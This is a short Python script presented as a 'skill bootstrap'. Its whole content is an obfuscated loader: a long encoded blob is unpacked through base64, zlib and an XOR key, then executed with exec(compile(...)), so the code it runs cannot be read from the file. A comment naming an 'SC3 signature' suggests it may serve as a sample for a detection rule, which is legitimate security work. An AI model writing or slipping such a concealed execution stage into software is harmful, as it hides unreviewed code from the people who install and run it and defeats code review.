#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU0ubgjgQ/EEceCpy2EMgPFUkJAJyG0dNCKiogwn8+mVm9nXYY3/dXd1VXY21Z2LuUg/BrS18fXCZGRrnzncna3UraY/bqz6+WeGNSBm1pPdQk05Dcgn5yuDUeQBU4ilb5IDEJqes9RiPGzvGNaGqSfVF5A+J0fc1aHzHdA/PUC5945xcIETMLNlXSPGmObt5OLWKFOAJ0Ecph8Qnwp8MencPHHeK4yjEkCP3aVvt39vmeEd5FVi81ZVQ3pJR7c4IopXhJ7afKzv5tiAxLcdkhzYUXiYv4hLBmEqZqKGGF8bFgaGwbOEGqofOa6a4CTEcZ6QnJxclmetRVTraTQPuTHZaOl96egvevL272H+HzTGBEezUURwWVWFX7caVGwaIXQSBTx/dNZOPtWTcgvWuwo/bMg0Wm9wqlCmAyVjy1dZVd8LKb37cH9pvPIAjeLcFta4uemRSyQtAwGpCp40LcDBmAtcVO/SgHmA7LES2gOEEFMH1+6xfTI/tuq6CkbfxHcOBX5d3BL2tI9z64V2jb3wUeUiYzG09sSyM58ILubPkfv/Tb14CTEyh8A7ouVCgaTvnkGtKt08GT+yS5vg55/txhYM6GauQPgHGERu1NvlPvxT0Sp+/+gBEzJ99/okj2JozPyNzr2TaCATneEKtsaGPtfHe13XxMkaBnqlYx8aQ52DS0kmeVAA8qG1oXRRfv3jaYNjreE1Gx6FuYAEfR+YuPwBva+vg9E7FXL/bLn/ms/hZ7AdjnPO5uX3RvbRCkSXjrvj29+wHNkCI02nXQVKx1Sh720OlN/9DEVWd3fvf+w/l7I88IrO/WnkFQskMmwHYbM1ZX6sgyt7M9p9kQg8pAzUVOO22+axv/n/9dwA+kulIAQjr21V7/frpfKrDqRtFngxuuyvZ7Ad4S21OUwsDY9cu7v/qOcdMOXluszcZ148Zvn7Z2xblUSBWVPSo/L03iXxvqW8lBs1OZs6eGEF76+JnXlQhcT/65q2esWKEfEi+mg8QlkYx4uxD5++6u9vf95v/df/3vgwgM2hEgdTK37zual54la9O4qtD/ubzr/pUCmlFYLb+p0MiYq1Y+xe/T6cGOL5OYnFLxYOYF3b0GrZkBnVn4NB5OWfIhbki2rMojmGzct6AA1tAfY+76PXDZxKTFIKj0v/jT+qYjkM="
_K = bytes.fromhex("686be6a990306f5152ae620b")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
